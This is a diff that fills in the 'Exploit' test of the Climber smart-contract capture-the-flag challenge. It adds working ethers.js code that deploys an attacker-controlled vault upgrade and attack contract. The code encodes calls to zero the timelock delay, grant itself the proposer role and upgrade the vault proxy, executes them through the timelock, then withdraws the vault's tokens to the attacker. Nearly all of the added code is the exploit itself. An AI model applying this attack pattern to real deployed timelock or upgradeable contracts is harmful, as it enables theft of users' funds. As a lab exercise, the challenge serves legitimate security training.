@@ -53,6 +53,41 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        this.newImpl = await (await ethers.getContractFactory('ClimberVaultV2', attacker)).deploy();
+        this.climberAttack = await (await ethers.getContractFactory('ClimberAttack', attacker)).deploy(this.timelock.address,this.vault.address,this.newImpl.address,this.token.address);
+        
+        const proposer_role = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("PROPOSER_ROLE"));
+
+        let ABI1 = ["function updateDelay(uint64 delay)"];
+        let intf1 = new ethers.utils.Interface(ABI1);
+        let data1 = intf1.encodeFunctionData("updateDelay",[0])
+        console.log('Im here')
+
+        let ABI2 = ["function grantRole(bytes32,address)"];
+        let intf2 = new ethers.utils.Interface(ABI2);
+        let data2 = intf2.encodeFunctionData("grantRole",[proposer_role,this.climberAttack.address]);
+        
+        let ABI3 = ["function upgradeTo(address)"];
+        let intf3 = new ethers.utils.Interface(ABI3);
+        let data3 = intf3.encodeFunctionData("upgradeTo",[this.newImpl.address]);
+        
+        let ABI4 = ["function attack()"]
+        let intf4 = new ethers.utils.Interface(ABI4);
+        let data4 = intf4.encodeFunctionData("attack");
+
+        let data = [data1,data2,data3,data4];
+        let target = [this.timelock.address,this.timelock.address,this.vault.address,this.climberAttack.address]
+
+        await this.climberAttack.connect(attacker).setData(target,data);
+        await this.timelock.connect(attacker).execute(target,Array(data.length).fill(0),data,ethers.utils.hexZeroPad("0x00",32));
+
+
+    //     await this.timelock.connect(attacker).execute([this.timelockAddress,this.timelockAddress,this.vault.address,this.climberAttack.address],[ethers.utils.parseEther("0"),ethers.utils.parseEther("0"),ethers.utils.parseEther("0"),ethers.utils.parseEther("0")],
+    //     [intf1.functions.updateDelay.encode("0"),intf2.functions._setupRole.encode(["0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1",this.climberAttack.address]),
+    // intf3.functions._authorizeUpgrade.encode(this.newImpl.address),intf4.function.attack.encode()],"0x0000000000000000000000000000000000000000000000000000000000000020")
+
+
+        await this.climberAttack.connect(attacker).withdraw(attacker.address);
     });
 
     after(async function () {
